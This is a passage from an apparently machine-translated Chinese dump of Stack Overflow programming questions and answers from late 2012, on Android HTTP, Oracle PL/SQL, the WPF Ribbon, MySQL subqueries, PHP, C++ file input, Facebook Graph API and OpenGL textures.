11-24 22:30:17.921: E/AndroidRuntime(7269):     at android.os.Looper.loop(Looper.java:130)  
11-24 22:30:17.921: E/AndroidRuntime(7269):     at android.app.ActivityThread.main(ActivityThread.java:3687)  
11-24 22:30:17.921: E/AndroidRuntime(7269):     at java.lang.reflect.Method.invokeNative(Native Method)  
11-24 22:30:17.921: E/AndroidRuntime(7269):     at java.lang.reflect.Method.invoke(Method.java:507)  
11-24 22:30:17.921: E/AndroidRuntime(7269):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:842)  
11-24 22:30:17.921: E/AndroidRuntime(7269):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:600)  
11-24 22:30:17.921: E/AndroidRuntime(7269):     at dalvik.system.NativeStart.main(Native Method)  
11-24 22:30:17.921: E/AndroidRuntime(7269): Caused by: java.lang.IllegalStateException: Target host must not be null, or set in parameters.  
11-24 22:30:17.921: E/AndroidRuntime(7269):     at org.apache.http.impl.client.DefaultRequestDirector.determineRoute(DefaultRequestDirector.java:572)  
11-24 22:30:17.921: E/AndroidRuntime(7269):     at org.apache.http.impl.client.DefaultRequestDirector.execute(DefaultRequestDirector.java:292)  
11-24 22:30:17.921: E/AndroidRuntime(7269):     at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:555)  
11-24 22:30:17.921: E/AndroidRuntime(7269):     at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:487)  
11-24 22:30:17.921: E/AndroidRuntime(7269):     at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:465)  
11-24 22:30:17.921: E/AndroidRuntime(7269):     at com.example.componenttest.AndroidWebActivity.onCreate(AndroidWebActivity.java:24)  
11-24 22:30:17.921: E/AndroidRuntime(7269):     at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1047)  
11-24 22:30:17.921: E/AndroidRuntime(7269):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1615)  
11-24 22:30:17.921: E/AndroidRuntime(7269):     ... 11 more 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T06:43:19.523

尝试改变

```
 HttpPost httppost = new HttpPost("10.0.2.2/InterfaceTest/GrabMe.php"); 
```

到

```
 HttpPost httppost = new HttpPost("http://10.0.2.2/InterfaceTest/GrabMe.php"); 
```

* * *

我强烈推荐使用 nuSOAP PHP 库来创建 SOAP 服务器。也许尝试一些更具体的 Android 客户端，例如这个库：[https](https://code.google.com/p/droidsoapclient/) ://code.google.com/p/droidsoapclient/ 。如果您打算使用 SOAP，那就是... =)

# sql - 如何检查过程中是否存在参数值？

> ID：13548891
> 
> 赞同：0
> 
> 时间：2012-11-25T06:36:34.370
> 
> 标签：sql, stored-procedures, plsql

以下是使用 2 个参数的过程：customer_code 和 pay_amount。该过程按预期工作，但是当我输入错误的 cus_code 时，我得到错误而不是我的自定义检查：

```
ORA-01403: no data found
ORA-06512: at "XXXXX.CUST_PAY", line 19
ORA-06512: at line 2 
```

步骤：

```
CREATE OR REPLACE PROCEDURE cust_pay (temp_ccode IN NUMBER, pay_amount IN NUMBER)AS
  BEGIN
    DECLARE 
    Value_check NUMBER;
    cbalance NUMBER;
      BEGIN
          SELECT Count(cus_code) 
          INTO value_check
          FROM customer
          WHERE cus_code = temp_ccode;

          IF value_check IS NULL THEN
              Dbms_Output.put_line('the value was not FOUND');
          ELSE
              UPDATE customer
              SET cus_balance = cus_balance - pay_amount
              WHERE cus_code = temp_ccode;

              SELECT cus_balance 
              INTO cbalance
              FROM customer
              WHERE cus_code = temp_ccode;

                IF cbalance < 0 THEN
                    Dbms_Output.put_line('The client owes us ' || cbalance);
                ELSE
                    Dbms_Output.put_line('Customer new balance is ' || cbalance);
                END IF;
        END IF;
     END;
  END; 
```

我做错了什么？我来宾我需要在发出 SELECT 请求之前检查值，对吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T09:30:38.043

您的问题实际上是由您的检查引起的：

```
 SELECT COUNT (cus_code)
    INTO value_check
    FROM customer
   WHERE cus_code = temp_ccode; 
```

上面的查询*永远不会*返回 NULL，这是您正在检查的内容。如果表中没有与参数匹配的值，`temp_ccode`则`value_check`将为 0。这反过来意味着您的 IF 语句不正确，这会导致您稍后在代码中出现错误。

不过，有一种更简单、更有效的方法。您可以使用[SQL%ROWCOUNT](http://docs.oracle.com/cd/E11882_01/appdev.112/e25519/static.htm#LNPLS528)找出您的 UPDATE 影响了多少行。如果返回值为 0，则您的客户不存在。

```
create or replace procedure cust_pay (
     Ptemp_ccode in number
   , Ppay_amount in number
     ) is

   l_balance number;

begin

   update customer
      set cus_balance = cus_balance - Ppay_amount
    where cus_code = Ptemp_ccode;

   if SQL%ROWCOUNT = 0 then
      dbms_output.put_line('The customer was not found.');
   else
      select cus_balance 
        into l_balance
        from customer
       where cus_code = temp_ccode;

      if l_balance < 0 then
         dbms_output.put_line('the client owes us ' || l_balance);
      else
         dbms_output.put_line('customer new balance is ' || l_balance);
      end if;
   end if;

end; 
```

无需在`select... into ...`此处处理 NO_DATA_FOUND 异常，因为您已经通过 UPDATE 语句保证`cus_code`存在。

请注意我所做的其他更改：

1.  参数和变量的不同命名约定，因此在代码中很清楚哪个是哪个。
2.  删除额外的嵌套 PL/SQL 块，这是不必要的。

一般来说，您永远不应该`dbms_ouput.put_line`在 PL/SQL 块中使用，因为您*必须*在那里才能看到发生了什么。这对于调试过程很好，但在生产代码中相当无用。

也可以使用[RETURN 语句](http://docs.oracle.com/cd/E11882_01/appdev.112/e25519/return_statement.htm#LNPLS01340)来避免嵌套的 IF 语句，我认为这样可以使代码更清晰，更易于阅读；虽然这是一个判断电话。

```
create or replace procedure cust_pay (
     Ptemp_ccode in number
   , Ppay_amount in number
     ) is

   l_balance number;

begin

   update customer
      set cus_balance = cus_balance - Ppay_amount
    where cus_code = Ptemp_ccode;

   if SQL%ROWCOUNT = 0 then
      return;
   end if;

   select cus_balance 
     into l_balance
     from customer
    where cus_code = temp_ccode;

   if l_balance < 0 then
      dbms_output.put_line('The client owes us ' || l_balance);
   else
      dbms_output.put_line('New balance is ' || l_balance);
   end if;

end; 
```

所有这些都假设您的 CUSTOMER 表在`cus_code`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-25T10:00:00.123

您的代码的更正版本在这里：

```
CREATE OR REPLACE PROCEDURE cust_pay (temp_ccode IN NUMBER, pay_amount IN NUMBER) AS
   Value_check NUMBER;
   cbalance NUMBER;
BEGIN
   SELECT Count(cus_code) 
   INTO value_check
   FROM customer
   WHERE cus_code = temp_ccode;

   IF value_check = 0 THEN
      Dbms_Output.put_line('the value was not FOUND');
   ELSE
      UPDATE customer
      SET cus_balance = cus_balance - pay_amount
      WHERE cus_code = temp_ccode
      RETURNING cus_balance
      INTO cbalance;

      IF cbalance < 0 THEN
         Dbms_Output.put_line('The client owes us ' || -cbalance);
      ELSE
         Dbms_Output.put_line('Customer new balance is ' || cbalance);
      END IF;
   END IF;
END; 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-25T10:14:25.703

Egor Skriptunoff 刚刚发布了一个[有趣的答案](https://stackoverflow.com/a/13549973/458741)，我不想为这个想法声称任何功劳，所以我将其发布为一个不同的答案。实际上可以在一个语句中完成所有操作。

根据我在其他答案中提倡的原则，如果您更新不存在的客户的余额并不重要，您可以结合我自己的答案和 Egor 的答案来得出这个：

```
create or replace procedure cust_pay (
     Ptemp_ccode in number
   , Ppay_amount in number
     ) is

   l_balance number;

begin

   update customer
      set cus_balance = cus_balance - Ppay_amount
    where cus_code = Ptemp_ccode
   returning cus_balance
     into l_balance;

   if SQL%ROWCOUNT = 0 then
      dbms_output.put_line('The customer was not found.');
   elsif l_balance < 0 then
      dbms_output.put_line('The client owes us ' || l_balance);
   else
      dbms_output.put_line('New balance is ' || l_balance);
   end if;

end; 
```

在一条语句中完成所有操作的好处是提高了速度。再次，您无需担心 NO_DATA_FOUND 异常，因为您只进行更新。

我在之前的回答中所说的一切仍然适用，`count(*)`a`select... into...`永远不会返回 null，总是一个数字。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-25T07:04:03.987

您可以在 sql 查询之前进行检查以验证参数值

另一种方法是使用`EXCEPTION NO_DATA_FOUND`

```
CREATE OR REPLACE PROCEDURE cust_pay (temp_ccode   IN NUMBER,
                                      pay_amount   IN NUMBER,errcode OUT NUMBER)
AS
BEGIN
   DECLARE
      Value_check   NUMBER;
      cbalance      NUMBER;
   BEGIN
      SELECT COUNT (cus_code)
        INTO value_check
        FROM customer
       WHERE cus_code = temp_ccode;

      IF value_check IS NULL
      THEN
         DBMS_OUTPUT.put_line ('the value was not FOUND');
      ELSE
         UPDATE customer
            SET cus_balance = cus_balance - pay_amount
          WHERE cus_code = temp_ccode;

         SELECT cus_balance
           INTO cbalance
           FROM customer
          WHERE cus_code = temp_ccode;

         IF cbalance < 0
         THEN
            DBMS_OUTPUT.put_line ('The client owes us ' || cbalance);
         ELSE
            DBMS_OUTPUT.put_line ('Customer new balance is ' || cbalance);
         END IF;
      END IF;
   END;
EXCEPTION
   WHEN NO_DATA_FOUND
   THEN
      DBMS_OUTPUT.put_line ('no data***' || SQLERRM);
      errcode := 1;
END; 
```

# wpf - 微软功能区的问题

> ID：13548894
> 
> 赞同：2
> 
> 时间：2012-11-25T06:37:03.943
> 
> 标签：wpf, user-interface, ribbon

我在使用 WPF 功能区时遇到了很多问题。这是一些`Ribbon`代码。（我正在使用`System.Windows.Controls.Ribbon`），所有这些都`RibbonWindow`在 .NET 4.5/VS2012 上。

```
<Ribbon VerticalAlignment="Top" Height="Auto" HorizontalAlignment="Stretch">
    <RibbonTab Header="Home" Height="Auto" VerticalAlignment="Top">
        <RibbonGroup Header="Save/Load" Height="Auto" Margin="0"
            VerticalAlignment="Top" Width="Auto">
            <Grid HorizontalAlignment="Stretch">
                <Grid.ColumnDefinitions>
                    <ColumnDefinition Width="Auto" />
                    <ColumnDefinition Width="Auto" />
                </Grid.ColumnDefinitions>
                <Button x:Name="cmdLoadImage" Click="cmdLoadImage_Click"
                    Margin="10,10,10,10" Grid.Column="0">
                    <Image Source="Images\load-icon.png" />
                </Button>
        </RibbonGroup>
    </RibbonTab>
</Ribbon> 
```

第1-2点是错误。

1.  `Ribbon`尽管将and的`VerticalAlignment`属性更改为 ，但我无法更改 的高度。视觉高度保持不变。`RibbonTab``RibbonGroup``Stretch`
2.  将 更改`Button`为 a`RibbonButton`会消失其中的图像，而将其保持不变会`Button`产生视觉影响。
3.  如何`Ribbon`像在 MS Office 中一样使跨度成为窗口？`ApplicationMenu`登顶之类的？

编辑：将不胜感激为 WPF 提供免费的备用功能区控件库。我想在商业上使用它。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-25T17:55:24.343

对于第一个问题：很抱歉让您失望 Microsoft Ribbon 具有固定的高度，因此您无法更改它。

至于第二个问题：您应该使用`LargeImageSource`and`SmallImageSource`而不是将图像放入`RibboButton`.

您的第三个问题不够明显，但是如果您的意思是要加入`ApplicationMenu`到窗口标题，这就是答案：您必须将窗口类型更改为`RibbonWindow`：

```
<RibbonWindow xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml">
</RibbonWindow> 
```

并在后面的窗口代码中：

```
public partial class MainWindow : RibbonWindow
{
} 
```

你的设计有一些错误，让我们修复它。

首先，您必须将功能区放在网格中：

```
<RibbonWindow xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml">
    <Grid>
        <Grid.RowDefinitions>
            <RowDefinition Height="auto" />
            <RowDefinition Height="*" />
        </Grid.RowDefinitions>
        <Ribbon Focusable="False" Height="138" Name="MainRibbon"
            VerticalAlignment="Top">
            <RibbonTab Header="Home" IsSelected="True" KeyTip="H">
                <RibbonGroup Header="Tools" KeyTip="T">
                    <RibbonButton Click="btnSave_Click" ToolTipTitle=""
                        ToolTipDescription="" Name="btnSave"
                        LargeImageSource="..\..\Images\RibbonIcons\Save.png"
                        Label="Save" KeyTip="S"/>
                </RibbonGroup>
            </RibbonTab>
        </Ribbon>
    </Grid>
</RibbonWindow> 
```

注意：您必须设置`LargeImageSource`属性才能`RibbonButton`正确显示。

祝你好运。

# mysql - ERROR 1241 (21000): 执行查询时操作数应包含 1 列

> ID：13548895
> 
> 赞同：3
> 
> 时间：2012-11-25T06:37:03.573
> 
> 标签：mysql, sql, mysql-error-1241

```
 INSERT INTO People(Track_id_Reference) 
SELECT track_id 
FROM Tracks 
WHERE track_title IN (SELECT tracktitle 
                      FROM top100 
                      WHERE artist IN (SELECT p.People_name, t.artist 
                                       FROM People AS p 
                                       RIGHT JOIN top100 AS t 
                                       ON 
                                       p.People_name=t.artist 
                                       UNION DISTINCT 
                                       SELECT p.People_name, t.artist 
                                       FROM People AS p 
                                       LEFT JOIN top100 AS t 
                                       ON 
                                       p.People_name=t.artist));
```

我得到的错误是

`ERROR 1241 (21000): Operand should contain 1 column(s)`

联合返回 2 列的子查询。我怎样才能解决这个问题？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-25T06:38:13.633

你缺少`FROM`条款

```
SELECT track_id 
FROM   tableName
WHERE track_title 
```

所以完整的查询将是

```
INSERT INTO People (Track_id_Reference)
SELECT track_id
FROM                                      -- <<== add tableName here
WHERE track_title = (
                SELECT tracktitle
                FROM top100
                WHERE artist = (
                                SELECT p.People_name,
                                        t.artist
                                FROM People AS p
                                RIGHT JOIN top100 AS t
                                        ON p.People_name = t.artist

                                UNION

                                        DISTINCT
                                SELECT p.People_name,
                                        t.artist
                                FROM People AS p
                                LEFT JOIN top100 AS t
                                        ON p.People_name = t.artist
                                )
                ); 
```

另一个*很快就会出现*`=`的问题是在子查询的结果上使用等号，它`IN`比使用它更安全，`=`因为它会抛出异常，例如，子查询将返回多个值。例子，

```
INSERT INTO People (Track_id_Reference)
SELECT track_id
FROM                                      -- <<== add tableName here
WHERE track_title IN (
                SELECT tracktitle
                FROM top100 ............. 
```

# php - php if 在选项标签中

> ID：13548909
> 
> 赞同：0
> 
> 时间：2012-11-25T06:40:38.560
> 
> 标签：php

嗨，有人可以帮我吗？我真的很难将我的 if 语句放在这段代码中

```
<select name="date_opened_year">
<?php 
define('DOB_YEAR_START', 1962);
$current_year = date('Y');

for ($count = $current_year; $count >= DOB_YEAR_START; $count--)
{
    echo "<option value='{$count}'>{$count}</option>";
}
?>
</select> 
```

我在这里有一个代码，我在其中放置了 if 语句

```
<select name="date_opened_year">
<?php 
define('DOB_YEAR_START', 1962);
$current_year = date('Y');

for ($count = $current_year; $count >= DOB_YEAR_START; $count--)
{
    echo "<option value='{$count}' if($yy == $count) echo 'selected'>{$count}</option>";
}
?>
</select> 
```

$yy = 2003 好吧，它来自数据库中的查询，当我查看代码时，它给了我类似的东西

```
<option 'selected'="" echo="" 2012)="" if(2003="=" value="2012">2012</option> 
```

这是为什么？任何人都可以修改代码吗？谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T06:45:17.520

试试这个：

```
$selectStr = ($yy == $count) ? 'selected': '';
echo "<option value='".$count."' ".$selectStr.">".$count."</option>"; 
```

最好拆开。

您的 if 在字符串创建双引号内。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-25T06:47:04.620

做这个：

```
if($yy == $count){ 
   echo "<option value='{$count}' selected='selected'>{$count}</option>";
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-25T06:49:43.693

Echo 不会评估 if 语句。尝试使用 printf 或此的@DCoder 解决方案：

```
echo "<option value='{$count}'";
if($yy == $count) echo 'selected';
echo ">{$count}</option>"; 
```

# c++ - 程序不计算记录数

> ID：13548912
> 
> 赞同：0
> 
> 时间：2012-11-25T06:41:28.263
> 
> 标签：c++, ifstream

我编写了一个程序，它读取一个文件，写入另一个文件并打印到屏幕上。换句话说，它应该做三件事（即读、写和打印）。

该程序还应该计算名为“Chap_11_employee_data.txt”的文件中的记录数。但是，它只是显示以下内容。

```
**Total Records 0** 
    The End 
```

当它写入文件时，它还会显示奇怪的数字，例如 -858993460。我几乎尝试了所有方法，这导致我在这里注册了一个帐户。下面列出了我的代码以及我试图读取的文件和我试图写入的文件。

非常感谢你的家伙的时间。

代码：

```
#include <iostream>
#include <fstream>  
#include <iomanip>  
using std::cin;
using std::cout;
using std::endl;
using std::setw;
using std::ios;

using std::ifstream;
using std::ofstream;

const int EMPLOYEES = 20; 
const int MAX = 21;  

int ReadData( ifstream &inFile, ofstream &outFile, char name[][MAX], int age[] );
void WriteOutputFile( ofstream &outFile, char name[ ][MAX], int age[ ], int counter );
void PrintTotalsAndSummary( ofstream &out, int totalRecords );

int main()
{   
    char name[EMPLOYEES][MAX]; 
    int age[EMPLOYEES];
    int record_counter(0);

    ifstream inFile;    

    ofstream outFile( "Chap_11_Report.txt" );  

    inFile.open( "Chap_11_employee_data.txt" );  

    if ( inFile.is_open() )   
    {   
        record_counter = ReadData( inFile, outFile, name, age );
        inFile.close();

        if( outFile.is_open() )
        {   
            WriteOutputFile( outFile, name, age, record_counter );
            PrintTotalsAndSummary( outFile, record_counter );
            outFile.close();            
        }   
        else
        {   
            cout << "Trouble Opening File";  
            cout << "\n\n\t\t ** About to EXIT NOW! ** ";
        }   
    }   
    else
    {   
        cout << "Trouble Opening File";
        cout << "\n\n\t\t ** About to EXIT NOW! ** ";
    }   
    return 0;
}
int ReadData( ifstream & inFile, ofstream & outFile, char name[][MAX], int age[] )
{   
    int counter = 0;
    inFile >> name[counter] >> age[counter]; // Priming Read

    while ( !inFile.eof() )
    {
        cout << setiosflags( ios::left ) << setw( 25 )
            <<  name[counter] << resetiosflags( ios::left )
            << setw( 4 ) << age [counter] << endl;
        counter++;
        inFile >> name[counter] >> age[counter];
    }

    return counter;
}

void WriteOutputFile( ofstream &outFile, char name[][MAX], int age[], int counter)
{
    outFile << "   Here is the Output File" << endl;
    for ( int r = 0; r <= counter; r++ )
    {
        outFile << setiosflags( ios::left ) << setw( 25 )
            << name[r] << setw( 4 )
            << resetiosflags( ios::left ) << age[r]
            << endl;
    }
}

void PrintTotalsAndSummary( ofstream &outFile, int totalRecords )
{
    // To screen
    cout  << "\n\n\t** Total Records: " << totalRecords << " **\n"
        << "\t\t The End \n";

    // To file
    outFile << "\n\n\t** Total Records: " << totalRecords << " **\n"
        << "\t\t The End \n";
} 
```

我正在阅读的文件（Chap_11_employee_data.txt）：

```
"Alexis","Blough",1-1921,"CEO"
"Bill","Pay",1-7711,"Accounting"
"Willy","Makit",4-1595,"Sales"
"Marie","Murray",1-4986,"MIS"
"Cal","Caldwellowinski",5-0911,"MIS"
"Jamie","Johanasola",5-9999,"Marketing" 
```

我正在写的文件（Chap_11_Report.txt）：

```
Here is the Output File
                     -858993460

    ** Total Records: 0 **
         The End 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T07:01:27.330

这是您的输入语句...

```
inFile >> name[counter] >> age[counter]; 
```

输出文件格式是这样的......

```
"Alexis","Blough",1-1921,"CEO"
"Bill","Pay",1-7711,"Accounting" 
```

输入语句读取名称，直到遇到空格或结束符为止。所以在第一种情况下，它会读取整行，因为单词之间没有空格。接下来，它将输入年龄，它是一个整数。它将从第二行开始输入年龄，从一开始就充满了字符。整数流中的字符是未定义的行为。这就是你得到错误结果的原因。

问题是文件格式与输入格式不匹配。尝试同步它们。

要读取空格，请使用`inFile.get()`or `inFile.getline()`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-25T07:44:20.353

你的阅读有一个问题：

```
while ( !inFile.eof() ) 
```

问题是流可能会以非 eof() 的方式变坏。如果发生这种情况，您将进入无限循环。所以你真的应该检查 bad()。

```
while ( !inFile.bad() ) // check for eof and other error cases. 
```

通常这个测试是完全错误的。但是您已经设法通过执行以下操作来解决这个问题：

```
<Get Input>

while ( !inFile.bad() )
{
    < DO WORK>
    <Get Input>
} 
```

可以通过以下方式实现相同的效果（以更惯用的方式）：

```
while ( <Get Input> )
{
    < DO WORK>
} 
```

读取（使用 >> 或 std::getline()）返回对流的引用。当它在布尔上下文中使用时（如 while 循环测试），它被转换为 bool（实际上就像语言律师一样的 bool），表示通过使用 bad 获得的流的状态。因此，只有在读取实际工作时才输入循环体。

输入流操作符非常简单，任何输入失败都会在流内部设置一个内部失败位，导致它们被占用并且在失败位被重置之前不提供进一步的输入。

鉴于您提供的输入，这将失败：

```
inFile >> name[counter] >> age[counter]; 
```

该变量`name[counter]`表示一个 C-String 并且输入运算符 >> 当应用于 C-String 时将读取到第一个空白字符（在本例中为换行符）。所以在这里我们分配：

```
"Alexis","Blough",1-1921,"CEO" 
```

到这个值。

然后我们尝试使用`age[counter]`整数值继续阅读。这会尝试从以下位置读取整数：

```
"Bill","Pay",1-7711,"Accounting" 
```

这将失败，因为字符`'"'`不是数字。

你应该做的是：

```
std::string  name;
std::getline(inFile, name, ','); // Read upto the ',' character (and discard it)
// You may want to remove the quotes here.

int age = 0;
// Age is not defined in the input so set it manually.

std::string  line;
std::getline(inFile, line);      // Read and ignore the rest of the line. 
```

# c# - IE 中的保护模式打开时无法获取任何事件

> ID：13548915
> 
> 赞同：0
> 
> 时间：2012-11-25T06:42:46.107
> 
> 标签：c#, winforms, internet-explorer, events, protected-mode

我正在用 Winform 编写一个 IE 插件（工具栏），我需要获取鼠标位置和键盘按键

当 IE 处于保护模式时，我没有收到任何 Windows 事件，

即使`protected override void OnLostFocus(EventArgs e)`是不工作！

有没有办法在保护模式下从 IE 获取事件？

没有保护模式**一切**正常！

*请不要参考我这篇文章：* [**了解和在保护模式下工作 Internet Explorer**](http://msdn.microsoft.com/en-us/library/bb250462%28VS.85%29.aspx)

# model-view-controller - 多控制器与单控制器

> ID：13548916
> 
> 赞同：2
> 
> 时间：2012-11-25T06:42:57.980
> 
> 标签：model-view-controller, design-patterns, frameworks

我有 5 个不同的模块，每个模块都是一个独立的子系统，有一个独立于其他的控制器。现在我想构建一个包含这 5 个模块的单个系统（无需更改模块）。

对于这种系统最好使用哪种方法，我有点困惑。

1.  我是否应该开发一个控制器来协调所有五个模块控制器（意味着一个用于协调其他控制器的控制器）来使用模块。

2.  我是否应该结合所有五个控制器的功能并将它们放在一个控制器中（意味着系统只有一个控制器）。

这是我的学术任务。请解释选择的最佳方法。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-30T06:09:27.440

好的方法是您应该为每个模块创建单独的控件。通过这种方法，您可以轻松维护每个模块的逻辑

您还可以查看以下链接：

[在 ASP.NET MVC 中使用多个 Controller 类有什么好处？](https://stackoverflow.com/questions/4027115/what-is-the-advantage-of-using-multiple-controller-classes-in-asp-net-mvc)

# javascript - 需要帮助调试 - IE 不在网站上显示 jquery 背景滑块

> ID：13548918
> 
> 赞同：1
> 
> 时间：2012-11-25T06:43:34.983
> 
> 标签：javascript, html, css, internet-explorer, web-testing

我遇到这个问题已经一个多月了，客户在解决之前不会付钱给我。

该网站是： http: [//www.cardwells.co.nz](http://www.cardwells.co.nz)

我使用 WordPress 作为带有模板和一些自定义工作的 CMS。

该模板带有一个内置的滑块背景，适用于除 IE 之外的所有浏览器。

我还在使用[http://www.smoothdivscroll.com/clickableLogoParade.html](http://www.smoothdivscroll.com/clickableLogoParade.html)作为底部的滚动条。

基本上我不知道为什么它不能在 IE 中工作 - 一切似乎都应该工作。我已经通过 w3 检查器运行了该站点并使用了该 IE 特定的 CSS 文件 - 但没有骰子。

请帮忙。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T03:19:52.463

没有真正的解决方案 - 真的 =\ 我禁用、删除、重新上传和重新启用模板。文件是未命中或沿线某处的数据库连接错误。这么笨。

# facebook - 自定义高度宽度的图像 - Facebook Graph API（相册/照片）

> ID：13548920
> 
> 赞同：1
> 
> 时间：2012-11-25T06:44:52.390
> 
> 标签：facebook, facebook-graph-api

我正在尝试使用 Graph API 从我在 facebook 上的相册中提取图像，并且我能够这样做。

使用通话 - graph.facebook.com/albumID/photos

上面的调用响应了我需要的所有数据，并响应了各种大小的所有图像的 URL：

```
 {
      "picture": "URL Here",
      "source": "URL Here",
      "height": 540,
      "width": 720,
      "images": [
        {
          "height": 972,
          "width": 1296,
          "source": "URL Here"
        },
        {
          "height": 720,
          "width": 960,
          "source": "URL Here"
        },
        {
          "height": 540,
          "width": 720,
          "source": "URL Here"
        },
        {
          "height": 450,
          "width": 600,
          "source": "URL Here"
        },
        {
          "height": 360,
          "width": 480,
          "source": "URL Here"
        },
        {
          "height": 240,
          "width": 320,
          "source": "URL Here"
        },
        {
          "height": 135,
          "width": 180,
          "source": "URL Here"
        },
        {
          "height": 97,
          "width": 130,
          "source": "URL Here"
        },
        {
          "height": 97,
          "width": 130,
          "source": "URL Here"
        }
      ], 
```

有没有一种方法可以让我获得我想要的大小的相册中的图像？例如：150x120 或 190x210 等。

谢谢，雷诺琼斯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T09:16:12.090

> 有没有一种方法可以让我获得我想要的大小的相册中的图像？例如：150x120 或 190x210 等。

**不**，这是不可能的。您必须使用 Facebook 提供的其中一张照片。

# android - Android 中 OpenGL 的纹理加载问题

> ID：13548925
> 
> 赞同：1
> 
> 时间：2012-11-25T06:45:44.093
> 
> 标签：android, opengl-es, textures

好的，让我先说我对 OpenGL 非常陌生，因为它与 Android 有关，虽然我已经阅读了一段时间，但我无法在编码中克服这个障碍。

目前，我正在尝试编写一个类，以将位于我的 drawables 文件夹中的 .png 文件中的纹理加载到我在 Blender 中制作的 .obj 模型上。我在 Blender 模型上进行了 UV 展开，然后使用 uv 展开作为 .png 文件的指南。

当前的问题是我能够将纹理加载到模型上，但它是一种纯色，似乎来自纹理文件。显然，我对 Blender 中的 UV 纹理了解不够，但是有这么多不同的 OpenGL 库，并且从 PC 到 Android 的变化如此之多，以至于我很难理解在哪里可以工作。

如果有人可以帮助我，我将不胜感激。这是一些相关的代码，我会根据需要发布更多：

来自 TextureLoader：

```
public Texture getTexture(GL10 gl, final int ref) throws IOException {
    Texture tex = (Texture) table.get(ref);

    if (tex != null) {
        return tex;
    }

    Log.i("Textures:", "Loading texture: " + ref);

    tex = getTexture(gl, ref,
            GL10.GL_TEXTURE_2D, // target
            GL10.GL_RGBA,     // dst pixel format
            GL10.GL_LINEAR, // min filter (unused)
            GL10.GL_NEAREST);

    table.put(ref,tex);

    return tex;
}

public Texture getTexture(GL10 gl, final int ref,
                            int target, 
                            int dstPixelFormat, 
                            int minFilter, 
                            int magFilter)  throws IOException {
    if (!sReady) {
      throw new RuntimeException("Texture Loader not prepared");
    }

    int srcPixelFormat = 0;

    // create the texture ID for this texture 
    int id = createID(gl);
    Texture texture = new Texture(target, id);

    // bind this texture 
    gl.glBindTexture(target, id); 

    Bitmap bitmap = loadImage(ref);  
    texture.setWidth(bitmap.getWidth());
    texture.setHeight(bitmap.getHeight());

    if (bitmap.hasAlpha()) {
        srcPixelFormat = GL10.GL_RGBA;
    } else {
        srcPixelFormat = GL10.GL_RGB;
    }

 // convert that image into a byte buffer of texture data 
    ByteBuffer textureBuffer = convertImageData(bitmap); 

    if (target == GL10.GL_TEXTURE_2D) { 
        gl.glTexParameterf(target, GL10.GL_TEXTURE_MIN_FILTER, minFilter); 
        gl.glTexParameterf(target, GL10.GL_TEXTURE_MAG_FILTER, magFilter); 
    } 

    GLUtils.texImage2D(target, 0, bitmap, 0);
    /*gl.glTexImage2D(target, 
                      0, 
                      dstPixelFormat, 
                      get2Fold(bitmap.getWidth()), 
                      get2Fold(bitmap.getHeight()), 
                      0, 
                      srcPixelFormat, 
                      GL10.GL_UNSIGNED_BYTE, 
                      textureBuffer);*/

    bitmap.recycle();

    return texture;
  }

/**
 * Get the closest greater power of 2 to the fold number
 * 
 * @param fold The target number
 * @return The power of 2
 */
private int get2Fold(int fold) {
    int ret = 2;
    while (ret < fold) {
        ret *= 2;
    }
    return ret;
}

/**
 * Convert the buffered image to a texture
 *
 * @param bufferedImage The image to convert to a texture
 * @param texture The texture to store the data into
 * @return A buffer containing the data
 */
private ByteBuffer convertImageData(Bitmap bitmap) { 
    ByteBuffer imageBuffer = null;

    ByteArrayOutputStream stream = new ByteArrayOutputStream();
    bitmap.compress(Bitmap.CompressFormat.PNG, 100, stream);
    byte[] data = stream.toByteArray();

    imageBuffer = ByteBuffer.allocateDirect(data.length); 
    imageBuffer.order(ByteOrder.nativeOrder()); 
    imageBuffer.put(data, 0, data.length); 
    imageBuffer.flip();

    return imageBuffer; 
}

/**
 * Creates an integer buffer to hold specified ints
 * - strictly a utility method
 *
 * @param size how many int to contain
 * @return created IntBuffer
 */
protected IntBuffer createIntBuffer(int size) {
  ByteBuffer temp = ByteBuffer.allocateDirect(4 * size);
  temp.order(ByteOrder.nativeOrder());

  return temp.asIntBuffer();
}

private Bitmap loadImage(int ref) {
    Bitmap bitmap = null;

    Matrix flip = new Matrix();
    flip.postScale(1f, -1f);

    // This will tell the BitmapFactory to not scale based on the device's pixel density:
    BitmapFactory.Options opts = new BitmapFactory.Options();
    opts.inScaled = false;

    Bitmap temp = BitmapFactory.decodeResource(sContext.getResources(), ref, opts);
    bitmap = Bitmap.createBitmap(temp, 0, 0, temp.getWidth(), temp.getHeight(), flip, true);
    temp.recycle();

    return bitmap;
} 
```

来自纹理：

```
public void bind(GL10 gl) {
  gl.glBindTexture(target, textureID);
  gl.glEnable(GL10.GL_TEXTURE_2D);
} 
```

因为它被称为：

```
public void render() {
    //Clear Screen And Depth Buffer
